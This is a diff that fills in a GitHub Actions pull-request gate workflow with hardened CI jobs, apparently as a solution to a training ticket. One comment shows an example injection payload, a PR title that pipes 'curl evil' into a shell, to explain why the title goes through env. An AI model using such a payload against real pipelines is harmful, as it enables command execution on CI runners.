@@ -1,19 +1,122 @@
-# TODO(ticket 01): build the PR gate workflow. tests/test_repo_gates.py defines done.
-#
-# Hints, not answers:
-# - Trigger on pull_request. Set top-level `permissions: contents: read` and widen per job only where needed.
-# - Pin every action to a full commit SHA with the tag in a comment. Read zizmor's docs on why tags are unsafe.
-# - Never put ${{ github.event.pull_request.title }} straight into a `run:` line. Why is that an injection risk? Pass it via `env:`.
-# - Split jobs so a failure tells you which gate broke: naming, lint, types, test, mutation, deps, secrets, sast, workflows.
-# - gitleaks needs the full history (fetch-depth: 0) to scan every commit in the PR.
-# - CodeQL may live in its own workflow file; it only runs free while the repo is public.
-
 name: pr
+
 on:
   pull_request:
+    # `edited` re-runs the checks when someone fixes the PR title.
+    types: [opened, synchronize, reopened, edited]
+
+# Every job starts read-only. A job that needs more asks for it itself.
+permissions:
+  contents: read
+
+# A new push cancels the previous run for the same PR, saving minutes.
+concurrency:
+  group: pr-${{ github.event.pull_request.number }}
+  cancel-in-progress: true
 
 jobs:
-  todo:
+  naming:
     runs-on: ubuntu-latest
     steps:
-      - run: echo "TODO(ticket 01)" && exit 1
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          persist-credentials: false
+      - uses: astral-sh/setup-uv@1db35dd8eee11c5894872e0b383ae6c406cf738d # v10.4.0
+      - name: Check the branch name and PR title
+        # The title is attacker-controlled text. Passing it through env makes it
+        # a plain shell variable, so a title like `"; curl evil | sh` cannot run.
+        env:
+          BRANCH: ${{ github.head_ref }}
+          TITLE: ${{ github.event.pull_request.title }}
+        run: uv run --no-dev python -m analytics_platform.naming "$BRANCH" "$TITLE"
+
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          persist-credentials: false
+      - uses: astral-sh/setup-uv@1db35dd8eee11c5894872e0b383ae6c406cf738d # v10.4.0
+      - run: uv run ruff check .
+      - run: uv run ruff format --check .
+      - run: uv run sqlfluff lint dbt
+
+  types:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          persist-credentials: false
+      - uses: astral-sh/setup-uv@1db35dd8eee11c5894872e0b383ae6c406cf738d # v10.4.0
+      - run: uv run mypy
+
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          persist-credentials: false
+      - uses: astral-sh/setup-uv@1db35dd8eee11c5894872e0b383ae6c406cf738d # v10.4.0
+      - run: uv run pytest --cov
+
+  mutation:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          persist-credentials: false
+      - uses: astral-sh/setup-uv@1db35dd8eee11c5894872e0b383ae6c406cf738d # v10.4.0
+      - run: uv run mutmut run
+      - run: uv run mutmut export-cicd-stats
+      - run: uv run python scripts/check_mutation_score.py 85
+
+  deps:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          persist-credentials: false
+      - uses: astral-sh/setup-uv@1db35dd8eee11c5894872e0b383ae6c406cf738d # v10.4.0
+      - name: Audit the locked dependencies for known vulnerabilities
+        run: |
+          uv export --format requirements-txt --no-emit-project > requirements.txt
+          uv run pip-audit -r requirements.txt --disable-pip
+      # text-unidecode is GPL/Artistic and arrives through dbt. It is a dev-only tool that is never
+      # shipped or distributed, so GPL's copyleft does not reach our code. Revisit if that changes.
+      - name: Check licences
+        run: >-
+          uv run pip-licenses --partial-match --ignore-packages analytics-platform text-unidecode
+          --allow-only="MIT;BSD;Apache;ISC;PSF;Python Software Foundation;MPL;Unlicense"
+
+  secrets:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      pull-requests: read # gitleaks-action lists the PR's commits through the API.
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          fetch-depth: 0 # Full history, so every commit in the PR is scanned, not just the last.
+          persist-credentials: false
+      - uses: gitleaks/gitleaks-action@e0c47f4f8be36e29cdc102c57e68cb5cbf0e8d1e # v3.0.0
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+  sast:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          persist-credentials: false
+      - uses: astral-sh/setup-uv@1db35dd8eee11c5894872e0b383ae6c406cf738d # v10.4.0
+      - run: uvx semgrep@1.187.0 scan --config p/python --config p/github-actions --error --metrics off
+
+  workflows:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          persist-credentials: false
+      - uses: astral-sh/setup-uv@1db35dd8eee11c5894872e0b383ae6c406cf738d # v10.4.0
+      - run: uv run actionlint
+      - run: uv run zizmor .github/workflows
